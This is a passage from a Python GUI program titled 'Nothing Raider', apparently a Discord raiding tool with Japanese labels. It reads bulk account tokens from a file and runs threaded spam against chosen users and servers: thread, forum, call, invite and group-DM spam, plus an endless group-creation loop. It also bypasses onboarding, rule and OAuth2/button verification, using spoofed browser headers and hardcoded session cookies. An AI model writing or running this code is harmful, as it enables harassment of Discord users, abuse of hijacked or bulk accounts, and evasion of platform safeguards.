    start_soundboard_button.pack(pady=10)

    start_mp3_button = ctk.CTkButton(frame, text="Start MP3 Spam", command=lambda: threading.Thread(target=start_mp3_spam, args=(link_entry.get(), mp3_entry.get())).start())
    start_mp3_button.pack(pady=10)

def start_onboarding_bypass_ui(guild_id_entry):
    guild_id = guild_id_entry.get()
    start_onboarding_bypass(guild_id)

def onboarding_bypass_tab(tab_frame):
    ctk.CTkLabel(tab_frame, text="Onboarding Bypass").pack(pady=10)
    guild_id_entry = ctk.CTkEntry(tab_frame, placeholder_text="Guild IDを入力", width=250)
    guild_id_entry.pack(pady=5, padx=5)
    start_button = ctk.CTkButton(tab_frame, text="Start", command=lambda: start_onboarding_bypass_ui(guild_id_entry))
    start_button.pack(pady=10)

def bio_changer_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    title_label = ctk.CTkLabel(frame, text="Bio Changer", font=("Arial", 20))
    title_label.pack(pady=10)

    bio_entry = ctk.CTkTextbox(frame, width=400, height=150)
    bio_entry.pack(pady=5)

    result_label = ctk.CTkLabel(frame, text="")
    result_label.pack(pady=5)

    def apply_bio_changes():
        bio = bio_entry.get("1.0", "end-1c")
        if not bio:
            result_label.configure(text="Bio cannot be empty.")
            return

        try:
            with open("tokens.txt", "r") as f:
                tokens = f.read().splitlines()
        except Exception as e:
            result_label.configure(text=f"Error reading tokens: {e}")
            return

        results = []
        results_lock = threading.Lock()

        def worker(token):
            try:
                result = bio_changer(token, bio)
                with results_lock:
                    results.append(result)
            except Exception as e:
                with results_lock:
                    results.append(f"Error with token {token}: {e}")

        threads = []
        for token in tokens:
            thread = threading.Thread(target=worker, args=(token,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    apply_button = ctk.CTkButton(frame, text="Apply Bio Change", command=apply_bio_changes)
    apply_button.pack(pady=10)

def oauth2_verify_bypassui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="GuildID(サーバーid)")
    guild_label.pack(pady=5)
    
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=5)

    def on_bypass_click():
        guild_id = guild_entry.get().strip()
        if not guild_id:
            tkinter.messagebox.showerror("入力ミス", "GuildIDが空です。")
            return

        def process_token_multithreaded(token):
            try:
                Oauth2_verify_bypass(guild_id, token)
            except ValueError as e:
                tkinter.messagebox.showerror("エラー", f"正しくないGuildID: {e}")

        def process_all_tokens():
            threads = []
            for token in tokens:
                thread = threading.Thread(target=process_token_multithreaded, args=(token,))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        threading.Thread(target=process_all_tokens).start()

    bypass_button = ctk.CTkButton(frame, text="Bypass", command=on_bypass_click)
    bypass_button.pack(pady=5)


def rule_bypass_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="GuildID")
    guild_label.pack(pady=5)

    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=5)

    def on_bypass_click():
        guild_id = guild_entry.get().strip()
        if not guild_id:
            tkinter.messagebox.showerror("入力に誤りがあります", "GuildIDが正しくありません。")
            return

        for token in tokens:
            threading.Thread(target=rule_bypass, args=(token, guild_id)).start()

    newspam_button = ctk.CTkButton(frame, text="Rule bypass", command=on_bypass_click)
    newspam_button.pack(pady=5)

def avatar_changer_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    status_label = ctk.CTkLabel(frame, text="Avatar changer(先にonlinerを実行)")
    status_label.pack(pady=5)

    def on_avatar_change_click():


        threading.Thread(target=start_avatar_change_threads()).start()

    avatar_button = ctk.CTkButton(frame, text="Change Avatar", command=on_avatar_change_click)
    avatar_button.pack(pady=5)

def run_button_bypass(message_id, channel_id, guild_id, optionbutton):
    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()

    for token in tokens:
        button_bypass(token, message_id, channel_id, guild_id, optionbutton)

def button_pusher_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    message_label = ctk.CTkLabel(frame, text="メッセージリンク")
    message_label.pack(pady=5)

    message_entry = ctk.CTkEntry(frame, width=400)
    message_entry.pack(pady=5)

    option_label = ctk.CTkLabel(frame, text="どこのボタンを押すか(左から何番目か)")
    option_label.pack(pady=5)

    option_entry = ctk.CTkEntry(frame, width=400)
    option_entry.pack(pady=5)

    def on_button_click():
        message_link = message_entry.get().strip()
        button_option = option_entry.get().strip()

        if not message_link:
            tkinter.messagebox.showerror("入力に誤りがあります", "Message Linkを入力してください。")
            return

        if not message_link.startswith("https://"):
            tkinter.messagebox.showerror("入力に誤りがあります", "URLの形式が正しくありません。")
            return

        parts = message_link.split("/")
        if len(parts) < 7:
            tkinter.messagebox.showerror("入力に誤りがあります", "URLの構造が正しくありません。")
            return

        guild_id = parts[4]
        channel_id = parts[5]
        message_id = parts[6]

        if not button_option:
            button_option = 0
        else:
            button_option = int(button_option)

        try:
            with open('tokens.txt', 'r') as file:
                tokens = [line.strip() for line in file.readlines() if line.strip()]
        except Exception as e:
            print(f"tokenの読み込みに失敗|{e}")
            return

        max_workers = len(tokens)
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)

        futures = [executor.submit(button_bypass, token, message_id, channel_id, guild_id, button_option) for token in tokens]

        concurrent.futures.wait(futures)

    button_push_button = ctk.CTkButton(frame, text="Button Pusher", command=on_button_click)
    button_push_button.pack(pady=5)

def auto_oauth2_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="ClientID (アプリid)")
    guild_label.pack(pady=5)
    
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=5)

    def on_bypass_click():
        client_id = guild_entry.get().strip()
        if not client_id:
            tkinter.messagebox.showerror("入力ミス", "ClientIDが空です。")
            return

        def process_token_multithreaded(token):
            try:
                auto_oauth2(client_id, token)
            except ValueError as e:
                tkinter.messagebox.showerror("エラー", f"正しくないClientID: {e}")

        def process_all_tokens():
            threads = []
            for token in tokens:
                thread = threading.Thread(target=process_token_multithreaded, args=(token,))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        threading.Thread(target=process_all_tokens).start()

    bypass_button = ctk.CTkButton(frame, text="連携する", command=on_bypass_click)
    bypass_button.pack(pady=5)

def thread_spam_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    fdsa = ctk.CTkLabel(frame, text="スレッドspammer|すぐレートリミットなります。")
    fdsa.pack(pady=5)
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=5)
    label1 = ctk.CTkLabel(frame, text="スレッドの名前")
    label1.pack(pady=5)
    name_entry = ctk.CTkEntry(frame, width=400)
    name_entry.pack(pady=5)

    def on_spam_click():
        channel_id = channel_entry.get().strip()
        name = name_entry.get().strip()
        if not channel_id:
            tkinter.messagebox.showerror("入力に誤りがあります", "ChannelIDが正しくありません。")
            return

        for token in tokens:
            threading.Thread(target=thread_spam, args=(token, channel_id, name)).start()

    spam_button = ctk.CTkButton(frame, text="Thread Spam", command=on_spam_click)
    spam_button.pack(pady=5)

def call_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    # ユーザーID入力フィールド
    user_id_label = ctk.CTkLabel(frame, text="User ID")
    user_id_label.pack(pady=5)
    user_id_entry = ctk.CTkEntry(frame, width=400)
    user_id_entry.pack(pady=5)

    # Startボタン
    def start_call_spamming():
        global stop_call_spammer
        stop_call_spammer = False
        user_id = user_id_entry.get().strip()
        if not user_id:
            tkinter.messagebox.showerror("エラー", "User IDを入力してください。")
            return
        if not user_id.isdigit():
            tkinter.messagebox.showerror("エラー", "User IDは数値で入力してください。")
            return

        # トークンの読み込み
        tokens = read_tokens('tokens.txt')
        if not tokens:
            tkinter.messagebox.showerror("エラー", "トークンが読み込めませんでした。")
            return

        # スパム処理を別スレッドで実行
        threading.Thread(
            target=process_callspammer,
            args=(tokens, user_id),
            daemon=True
        ).start()

    start_button = ctk.CTkButton(frame, text="Start", command=start_call_spamming)
    start_button.pack(pady=10)

    # Stopボタン
    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_call_spammer_fn)
    stop_button.pack(pady=10)

def forum_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    # Forum Channel ID
    channel_label = ctk.CTkLabel(frame, text="フォーラムチャンネルID")
    channel_label.pack(pady=0)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=0)

    # Thread名のベース
    name_label = ctk.CTkLabel(frame, text="スレッド名のプレフィックス（例：爆撃スレ）")
    name_label.pack(pady=0)
    name_entry = ctk.CTkEntry(frame, width=400)
    name_entry.insert(0, "スレッド")
    name_entry.pack(pady=0)

    # メッセージ内容
    message_label = ctk.CTkLabel(frame, text="投稿するメッセージ")
    message_label.pack(pady=0)
    message_entry = ctk.CTkTextbox(frame, width=500, height=200)
    message_entry.pack(pady=0)

    # インターバル
    interval_label = ctk.CTkLabel(frame, text="連投間隔（秒）")
    interval_label.pack(pady=0)
    interval_entry = ctk.CTkEntry(frame, width=100)
    interval_entry.insert(0, "2")
    interval_entry.pack(pady=0)

    # Startボタン
    def start_forum_spamming():
        channel_id = channel_entry.get().strip()
        message = message_entry.get("1.0", "end-1c").strip()
        thread_prefix = name_entry.get().strip()
        interval = float(interval_entry.get() or 2)

        if not channel_id or not message:
            tkinter.messagebox.showerror("エラー", "チャンネルIDとメッセージを入力してください。")
            return

        tokens = read_tokens("tokens.txt")
        if not tokens:
            tkinter.messagebox.showerror("エラー", "トークンが読み込めませんでした。")
            return

        threading.Thread(
            target=forum_spammer,
            args=(channel_id, message, tokens, thread_prefix, interval),
            daemon=True
        ).start()

    start_button = ctk.CTkButton(frame, text="Start", command=start_forum_spamming)
    start_button.pack(pady=5)

    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammer)
    stop_button.pack(pady=5)

def check_guild_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="Guild IDを貼ってください。")
    guild_label.pack(pady=5)

    guild_entry = ctk.CTkEntry(frame)
    guild_entry.pack(pady=5)

    check_button = ctk.CTkButton(
        frame,
        text="参加状況を確認",
        command=lambda: threading.Thread(target=check_guild_membership, args=(guild_entry.get(),)).start()
    )
    check_button.pack(pady=20)

def create_group(token, user_ids, group_name):
    global creating
    creating = True

    cookies = {
        '__dcfduid': '30a7acc0595611f0a301c3756353298d',
        '__sdcfduid': '30a7acc1595611f0a301c3756353298d5889fdd8e342132e2bfcf6b657e3d73700579fbb7347c574420a5342d622ebd3',
        '__cfruid': 'abe79270a06b9de0f01f1574e2eae4a828ba3b27-1751688716',
        '_cfuvid': 'T20jx._KOLGSYRCyI6Zu3L_bKSRveowaxRrtbCUJ8kA-1751688716695-0.0.1.1-604800000',
        '_gcl_au': '1.1.267527362.1751688718',
        'OptanonConsent': 'isGpcEnabled=0&datestamp=Sat+Jul+05+2025+13%3A11%3A57+GMT%2B0900+(%E6%97%A5%E6%9C%AC%E6%A8%99%E6%BA%96%E6%99%82)&version=202501.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A0',
        '_ga_Q149DFWHT7': 'GS2.1.s1751688717$o1$g0$t1751688717$j60$l0$h0',
        '_ga': 'GA1.1.1145810027.1751688718',
        'cf_clearance': '93yhuxOeufuvPNKlpcKW4mA1SLRE0qK1NHr9vo7Rsio-1751689096-1.2.1.1-tQBZCTjUjW7xPrMBCDJNIe5j.X.TbMkjMRvP.sn_LD2.m85YfouftbMfvEgcA2J0Ax28YN9vBvxcRVEiX0qQQ3lZzm1H1V34ooaOpCSNRSpc8TDxMiAy456MlvBLPkFp4gnn2HWrYVudIyEULQAigIYyUhEpzj8mhD6ALzm8JwqTP7MHyU.w661nCQQWo8FevO1PBS8LD6dqNPWNqs8rH97uw5cejQah_0RTOflS97g',
        'locale': 'en-US',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'ja-JP,ja;q=0.9',
        'authorization': token,
        'dnt': '1',
        'origin': 'https://discord.com',
        'priority': 'u=1, i',
        'referer': 'https://discord.com/channels/@me',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkFkZCBGcmllbmRzIHRvIERNIn0=',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': 'Asia/Tokyo',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphLUpQIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM4LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQxNTc3MiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImI3OGQzZWM3LTFkMDUtNGEwMi1hMjU0LTI1YWIzMTE1YTkwYSIsImNsaWVudF9oZWFydGJlYXRfc2Vzc2lvbl9pZCI6IjE3Mzc1YTVmLTQxZWMtNGYwMS05YzQ3LTRjY2E5MmI4NGY5YSIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIn0=',
    }

    while creating:
        try:
            response = requests.post(
                'https://discord.com/api/v9/users/@me/channels',
                headers=headers,
                cookies=cookies,
                json={'recipients': []}
            )

            if response.status_code == 429:
                retry_after = response.json().get('retry_after', 5)
                print(f"[⚠️ Ratelimited] Retrying after {retry_after} seconds...")
                time.sleep(retry_after)
                continue

            if not response.ok:
                print(f"[❌ Failed to Create Empty Group] Status: {response.status_code}")
                try:
                    print(f"└▶ Detail: {response.json()}")
                except Exception:
                    print("└▶ No JSON response.")
                break

            channel_id = response.json().get('id')
            print(f"[✅ Empty Group Created] ID: {channel_id}")

            for user_id in user_ids:
                put_headers = headers.copy()
                put_headers.pop('Content-Type', None)
                put_headers['accept'] = '*/*'

                add_member_resp = requests.put(
                    f'https://discord.com/api/v9/channels/{channel_id}/recipients/{user_id}',
                    headers=put_headers,
                    cookies=cookies
                )

                if add_member_resp.status_code == 429:
                    retry_after = add_member_resp.json().get('retry_after', 5)
                    print(f"[⚠️ Ratelimited on adding member {user_id}] Retrying after {retry_after} seconds...")
                    time.sleep(retry_after)
                    add_member_resp = requests.put(
                        f'https://discord.com/api/v9/channels/{channel_id}/recipients/{user_id}',
                        headers=put_headers,
                        cookies=cookies
                    )

                if add_member_resp.ok:
                    print(f"[Member Added] UserID: {user_id}")
                else:
                    print(f"[Failed to Add Member] UserID: {user_id} Status: {add_member_resp.status_code}")
                    try:
                        print(f"└▶ Detail: {add_member_resp.json()}")
                    except Exception:
                        print("└▶ No JSON response.")

            rename_payload = {'name': group_name}
            rename_response = requests.patch(
                f'https://discord.com/api/v9/channels/{channel_id}',
                headers=headers,
                cookies=cookies,
                json=rename_payload
            )

            if rename_response.ok:
                print(f"[Name Set] Group name changed to: '{group_name}'")
            else:
                print(f"[Name Set Failed] Status: {rename_response.status_code}")
                try:
                    print(f"└▶ Detail: {rename_response.json()}")
                except Exception:
                    print("└▶ No JSON response.")
                break
        except requests.exceptions.RequestException as e:
            print(f"[⚠️ Network Error] {str(e)}")
            break
        except Exception as e:
            print(f"[🔥 Unexpected Error] {str(e)}")
            break

def stop_creating():
    global creating
    creating = False
    print("[Info] Group creation stopped.")

def new_group_creator_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    token_label = ctk.CTkLabel(frame, text="スパムに使用したいtoken（カンマ区切り）")
    token_label.pack(pady=0)
    token_entry = ctk.CTkTextbox(frame, width=500, height=100)
    token_entry.pack(pady=0)

    user_ids_label = ctk.CTkLabel(frame, text="User ID（カンマ区切り）")
    user_ids_label.pack(pady=0)
    user_ids_entry = ctk.CTkTextbox(frame, width=500, height=100)
    user_ids_entry.pack(pady=0)
    
    group_name_label = ctk.CTkLabel(frame, text="グループ名")
    group_name_label.pack(pady=0)
    group_name_entry = ctk.CTkEntry(frame, width=400)
    group_name_entry.pack(pady=0)

    def start_creating_groups():
        tokens_input = token_entry.get("1.0", "end-1c")
        user_ids_input = user_ids_entry.get("1.0", "end-1c")
        group_name = group_name_entry.get()

        tokens = [t.strip() for t in tokens_input.split(',') if t.strip()]
        user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]

        if not tokens or not user_ids or not group_name:
            print("[入力エラー] トークン、ユーザーID、またはグループ名が空です。")
            return

        for token in tokens:
            threading.Thread(
                target=create_group,
                args=(token, user_ids, group_name),
                daemon=True
            ).start()

    start_button = ctk.CTkButton(frame, text="Start", command=start_creating_groups)
    start_button.pack(pady=5)

    # Stopボタン
    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_creating)
    stop_button.pack(pady=5)

def new_invite_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    ctk.CTkLabel(frame, text="Channel ID").pack()
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack()

    ctk.CTkLabel(frame, text="Guild ID").pack()
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack()

    def start():
        channel_id = channel_entry.get().strip()
        guild_id = guild_entry.get().strip()
        if not channel_id or not guild_id:
            tkinter.messagebox.showerror("エラー", "Channel IDとGuild IDを入力してください")
            return
        threading.Thread(target=invite_spammer, args=(channel_id, guild_id), daemon=True).start()

    ctk.CTkButton(frame, text="Start", command=start).pack(pady=5)
    ctk.CTkButton(frame, text="Stop", command=stop_invite_spammer).pack(pady=5)
    
if __name__ == "__main__":
    root = ctk.CTk()  
    iconfile = 'asset/icon.ico'
    root.iconbitmap(default=iconfile)
    root.title(f"Nothing Raider | Loaded {token_count} tokens")
    root.geometry("900x500")
    os.system('cls')
    switch_to_main_ui()
    root.mainloop()